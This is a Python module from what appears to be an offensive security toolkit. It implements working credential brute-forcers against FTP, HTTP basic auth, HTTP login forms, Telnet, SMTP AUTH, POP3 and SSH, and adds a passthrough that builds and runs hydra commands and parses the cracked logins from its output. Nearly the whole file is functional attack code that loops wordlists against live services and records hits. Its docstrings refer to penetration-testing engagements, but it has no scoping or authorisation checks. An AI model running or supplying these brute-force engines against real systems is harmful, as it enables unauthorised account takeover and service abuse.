"""quantum.brute.services — network service brute force (hydra-style).

Real credential brute-forcers for the services operators
meet on engagements, plus the hydra passthrough:

* hydra — builds the documented command lines
  (hydra -l user -P wordlist ip <protocol> ...) and
  runs the system binary when installed (detect_hydra).
* FTP  — real brute force via ftplib (stdlib).
* HTTP basic auth — real brute force via requests.
* HTTP form POST — real brute force with field
  templates and failure-signature detection.
* Telnet — real brute force over raw sockets.
* SMTP AUTH / POP3 — real brute force via smtplib/poplib.
* SSH — real brute force when paramiko is installed
  (guarded import; honest error otherwise).

Every brute-forcer is sequential and rate-honest: it
reports tried/hits/elapsed and never fabricates a hit.
"""
from __future__ import annotations

import ftplib
import os
import poplib
import socket
import smtplib
import shutil
import subprocess
import time

from quantum.core.deps import requests
from quantum.core.logging import log

HYDRA_PROTOCOLS = [
    "ftp", "ssh", "telnet", "smtp", "http-get", "http-post-form",
    "pop3", "imap", "rlogin", "mysql", "postgres", "redis",
    "vnc", "svn", "cisco", "smb", "mssql", "oracle",
]

#: hydra exit-code semantics (documented): 0 found, 1 not found,
#: >1 error. hydra prints "login:" lines on success.
HYDRA_EXIT = {0: "found", 1: "not found", 2: "error"}


def detect_hydra():
    """Path to the system hydra binary, or None."""
    return shutil.which("hydra") or shutil.which("hydra.exe")


def hydra_command(target, protocol, user=None, user_list=None,
                     wordlist=None, port=None, threads=16,
                     verbose=False, extra=None):
    """Build a real hydra command line (documented flags).

    Exactly one of user / user_list must be given for
    login-based protocols; wordlist is the password list.
    """
    if protocol not in HYDRA_PROTOCOLS:
        raise ValueError(f"unknown protocol {protocol!r} "
                         f"(hydra: {', '.join(HYDRA_PROTOCOLS)})")
    if not wordlist:
        raise ValueError("hydra needs a password wordlist (-P)")
    if bool(user) == bool(user_list):
        raise ValueError("give exactly one of user (-l) or "
                         "user_list (-L)")
    argv = ["hydra"]
    if user:
        argv += ["-l", str(user)]
    if user_list:
        argv += ["-L", str(user_list)]
    argv += ["-P", str(wordlist)]
    if port:
        argv += ["-s", str(int(port))]
    argv += ["-t", str(int(threads))]
    if verbose:
        argv += ["-V"]
    host = str(target)
    if port:
        # hydra syntax: ip:port for non-default ports is
        # handled via -s; keep plain host
        pass
    argv.append(host)
    argv.append(protocol)
    argv += list(extra or [])
    return argv


def hydra_run(target, protocol, user=None, user_list=None,
                 wordlist=None, port=None, threads=16,
                 verbose=False, extra=None, timeout=600):
    """Run the system hydra binary (real passthrough).

    Parses hydra's real success lines
    ("[STATUS] ... login: <user>   password: <pass>")
    from stdout into structured hits.
    """
    if detect_hydra() is None:
        return {"error": "hydra not installed on this host "
                         "(Kali tool — install it, or use "
                         "the embedded brute_* engines which "
                         "crack ftp/http/telnet/smtp/pop3 "
                         "offline)",
                "argv": hydra_command(target, protocol, user,
                                        user_list, wordlist,
                                        port, threads, verbose,
                                        extra)}
    argv = hydra_command(target, protocol, user, user_list,
                           wordlist, port, threads, verbose,
                           extra)
    try:
        proc = subprocess.run(argv, capture_output=True,
                                text=True, timeout=timeout)
    except subprocess.TimeoutExpired:
        return {"argv": argv, "error": "hydra timed out"}
    hits = []
    for line in proc.stdout.splitlines():
        if "login:" in line and "password:" in line:
            m_user = line.split("login:", 1)[1]
            user_part = m_user.split("password:", 1)[0].strip()
            pass_part = m_user.split("password:", 1)[1].strip()
            hits.append({"user": user_part,
                         "password": pass_part,
                         "raw": line.strip()})
    return {"argv": argv, "returncode": proc.returncode,
            "status": HYDRA_EXIT.get(proc.returncode, "error"),
            "hits": hits, "stdout": proc.stdout,
            "stderr": proc.stderr, "backend": "system"}


# ------------------------------------------------------------------ words
def _words(wordlist):
    """Wordlist path or iterable -> lazy iterator of words."""
    if isinstance(wordlist, (str, bytes)) and os.path.isfile(
            str(wordlist)):
        def gen():
            with open(str(wordlist), encoding="utf-8",
                      errors="replace") as fh:
                for line in fh:
                    yield line.rstrip("\r\n")
        return gen()
    if isinstance(wordlist, (str, bytes)):
        return iter(str(wordlist).splitlines())
    return iter(wordlist)


def _probe_user_list(users):
    """user / user_list path / iterable -> list of users."""
    if users is None:
        return [None]
    if isinstance(users, (str, bytes)) and os.path.isfile(
            str(users)):
        with open(str(users), encoding="utf-8",
                  errors="replace") as fh:
            return [l.rstrip("\r\n") for l in fh if l.strip()]
    if isinstance(users, (str, bytes)):
        return [users]
    return list(users)


# ------------------------------------------------------------------ engines
def brute_ftp(host, port=21, users=None, wordlist=None,
                 timeout=10, progress=None):
    """Real FTP brute force (ftplib).

    Returns {"hits": [{"user","password"}], "tried",
             "elapsed_s", "errors"}.
    """
    hits = []
    tried = 0
    errors = 0
    start = time.time()
    for user in _probe_user_list(users):
        for word in _words(wordlist):
            tried += 1
            try:
                with ftplib.FTP() as ftp:
                    ftp.connect(host, int(port), timeout)
                    ftp.login(user or "anonymous", word)
                hits.append({"user": user, "password": word})
                log(f"FTP brute hit {host}:{port} "
                    f"{user}:{word}", "BRUTE")
            except (ftplib.error_perm, ConnectionError,
                    OSError) as exc:
                # wrong credentials / refused — keep going
                if not isinstance(exc, ftplib.error_perm):
                    errors += 1
            except Exception:  # noqa: BLE001 — brute loop
                errors += 1
            if progress and tried % 100 == 0:
                progress(tried, len(hits))
    return {"hits": hits, "tried": tried, "errors": errors,
            "elapsed_s": round(time.time() - start, 3),
            "target": f"{host}:{port}", "service": "ftp"}


def brute_http_basic(url, users=None, wordlist=None,
                        timeout=10, progress=None):
    """Real HTTP basic-auth brute force (requests).

    A hit is a 2xx response with the candidate credentials.
    """
    hits = []
    tried = 0
    start = time.time()
    for user in _probe_user_list(users):
        for word in _words(wordlist):
            tried += 1
            try:
                r = requests.get(url, auth=(user or "", word),
                                 timeout=timeout)
                if 200 <= r.status_code < 300:
                    hits.append({"user": user,
                                 "password": word,
                                 "status": r.status_code})
                    log(f"HTTP basic hit {url} "
                        f"{user}:{word}", "BRUTE")
            except Exception:  # noqa: BLE001 — brute loop
                pass
            if progress and tried % 100 == 0:
                progress(tried, len(hits))
    return {"hits": hits, "tried": tried,
            "elapsed_s": round(time.time() - start, 3),
            "target": url, "service": "http-basic"}


def brute_http_form(url, users=None, wordlist=None,
                       fields=None, failure_signature=None,
                       method="POST", timeout=10,
                       progress=None):
    """Real HTTP form-login brute force.

    fields: template dict, e.g. {"username": "{user}",
    "password": "{pass}", "Login": "submit"} — values
    containing {user}/{pass} are substituted. A candidate
    is a hit when the response does NOT contain the
    failure_signature (documented failure-detection
    approach used by hydra's http-post-form).
    """
    if not fields:
        raise ValueError("form brute force needs a field "
                         "template with {user}/{pass}")
    hits = []
    tried = 0
    start = time.time()
    for user in _probe_user_list(users):
        for word in _words(wordlist):
            tried += 1
            data = {}
            for k, v in fields.items():
                data[k] = str(v).replace("{user}",
                                            str(user or ""
                                            )).replace(
                                                "{pass}",
                                                str(word))
            try:
                if method.upper() == "GET":
                    r = requests.get(url, params=data,
                                     timeout=timeout)
                else:
                    r = requests.post(url, data=data,
                                      timeout=timeout)
                body = r.text
                if not failure_signature or \
                        failure_signature not in body:
                    hits.append({"user": user,
                                 "password": word,
                                 "status": r.status_code})
                    log(f"HTTP form hit {url} "
                        f"{user}:{word}", "BRUTE")
            except Exception:  # noqa: BLE001 — brute loop
                pass
            if progress and tried % 100 == 0:
                progress(tried, len(hits))
    return {"hits": hits, "tried": tried,
            "elapsed_s": round(time.time() - start, 3),
            "target": url, "service": "http-form"}


def brute_telnet(host, port=23, users=None, wordlist=None,
                    timeout=8, progress=None):
    """Real telnet brute force over raw sockets.

    Reads the login: / Password: prompts and checks for
    a post-login shell banner (a "$ " / "# " / "> "
    prompt after the password line).
    """
    hits = []
    tried = 0
    errors = 0
    start = time.time()
    for user in _probe_user_list(users):
        for word in _words(wordlist):
            tried += 1
            try:
                with socket.create_connection(
                        (host, int(port)), timeout) as s:
                    s.settimeout(timeout)
                    _ = s.recv(4096)  # banner
                    s.sendall((str(user or "") + "\r\n"
                               ).encode())
                    _ = s.recv(4096)  # password prompt
                    s.sendall((str(word) + "\r\n").encode())
                    time.sleep(0.2)
                    tail = s.recv(4096)
                if tail and any(p in tail for p in
                                (b"$ ", b"# ", b"> ", b"% ")):
                    hits.append({"user": user,
                                 "password": word})
                    log(f"telnet brute hit {host}:{port} "
                        f"{user}:{word}", "BRUTE")
            except OSError:
                errors += 1
            except Exception:  # noqa: BLE001 — brute loop
                errors += 1
            if progress and tried % 100 == 0:
                progress(tried, len(hits))
    return {"hits": hits, "tried": tried, "errors": errors,
            "elapsed_s": round(time.time() - start, 3),
            "target": f"{host}:{port}", "service": "telnet"}


def brute_smtp_auth(host, port=25, users=None, wordlist=None,
                       timeout=10, progress=None):
    """Real SMTP AUTH brute force (smtplib)."""
    hits = []
    tried = 0
    errors = 0
    start = time.time()
    for user in _probe_user_list(users):
        for word in _words(wordlist):
            tried += 1
            try:
                with smtplib.SMTP(host, int(port),
                                  timeout=timeout) as smtp:
                    smtp.ehlo()
                    if not smtp.has_extn("auth"):
                        errors += 1
                        continue
                    code, _ = smtp.login(
                        user or "anonymous", word)
                    if 200 <= code < 300:
                        hits.append({"user": user,
                                     "password": word})
                        log(f"SMTP AUTH hit {host}:{port} "
                            f"{user}:{word}", "BRUTE")
            except smtplib.SMTPAuthenticationError:
                pass
            except (OSError, smtplib.SMTPException):
                errors += 1
            except Exception:  # noqa: BLE001 — brute loop
                errors += 1
            if progress and tried % 100 == 0:
                progress(tried, len(hits))
    return {"hits": hits, "tried": tried, "errors": errors,
            "elapsed_s": round(time.time() - start, 3),
            "target": f"{host}:{port}", "service": "smtp-auth"}


def brute_pop3(host, port=110, users=None, wordlist=None,
                  timeout=10, progress=None):
    """Real POP3 brute force (poplib)."""
    hits = []
    tried = 0
    errors = 0
    start = time.time()
    for user in _probe_user_list(users):
        for word in _words(wordlist):
            tried += 1
            try:
                with poplib.POP3(host, int(port),
                                 timeout=timeout) as pop:
                    pop.user(user or "anonymous")
                    pop.pass_(word)
                    hits.append({"user": user,
                                 "password": word})
                    log(f"POP3 brute hit {host}:{port} "
                        f"{user}:{word}", "BRUTE")
            except poplib.error_proto:
                pass
            except OSError:
                errors += 1
            except Exception:  # noqa: BLE001 — brute loop
                errors += 1
            if progress and tried % 100 == 0:
                progress(tried, len(hits))
    return {"hits": hits, "tried": tried, "errors": errors,
            "elapsed_s": round(time.time() - start, 3),
            "target": f"{host}:{port}", "service": "pop3"}


def brute_ssh(host, port=22, users=None, wordlist=None,
                 timeout=10, progress=None):
    """Real SSH brute force — requires paramiko.

    paramiko is an optional dependency; when absent the
    engine reports the requirement honestly instead of
    simulating. (hydra passthrough covers ssh when the
    binary is installed.)
    """
    try:
        import paramiko  # noqa: PLC0415 — optional dep
    except ImportError:
        return {"error": "paramiko not installed — "
                         "pip install paramiko for the "
                         "embedded SSH engine, or use the "
                         "hydra passthrough",
                "target": f"{host}:{port}",
                "service": "ssh"}
    hits = []
    tried = 0
    errors = 0
    start = time.time()
    for user in _probe_user_list(users):
        for word in _words(wordlist):
            tried += 1
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(
                paramiko.AutoAddPolicy())
            try:
                client.connect(host, port=int(port),
                               username=user,
                               password=word,
                               timeout=timeout,
                               banner_timeout=timeout,
                               auth_timeout=timeout,
                               look_for_keys=False,
                               allow_agent=False)
                hits.append({"user": user, "password": word})
                log(f"SSH brute hit {host}:{port} "
                    f"{user}:{word}", "BRUTE")
                client.close()
            except paramiko.AuthenticationException:
                pass
            except (OSError, paramiko.SSHException):
                errors += 1
            except Exception:  # noqa: BLE001 — brute loop
                errors += 1
            finally:
                client.close()
            if progress and tried % 100 == 0:
                progress(tried, len(hits))
    return {"hits": hits, "tried": tried, "errors": errors,
            "elapsed_s": round(time.time() - start, 3),
            "target": f"{host}:{port}", "service": "ssh"}


# ------------------------------------------------------------------ state
SERVICES_STATE = {
    "embedded_engines": ["ftp", "http-basic", "http-form",
                         "telnet", "smtp-auth", "pop3",
                         "ssh (paramiko)"],
    "hydra_installed": None,  # filled at call time
    "hydra_protocols": HYDRA_PROTOCOLS,
}


def services_dashboard_state():
    """Webcard state for the cracking dashboard."""
    return {
        "hydra_installed": bool(detect_hydra()),
        "hydra_protocols": HYDRA_PROTOCOLS,
        "embedded_engines": SERVICES_STATE[
            "embedded_engines"],
        "attacks": {
            "ftp": "brute_ftp()",
            "http_basic": "brute_http_basic()",
            "http_form": "brute_http_form()",
            "telnet": "brute_telnet()",
            "smtp_auth": "brute_smtp_auth()",
            "pop3": "brute_pop3()",
            "ssh": "brute_ssh() (paramiko)",
            "hydra": "hydra_run() — system passthrough",
        },
        "note": "All embedded engines are real network "
                "protocol implementations. hydra_run() "
                "executes the system hydra binary when "
                "installed and parses its real output.",
    }
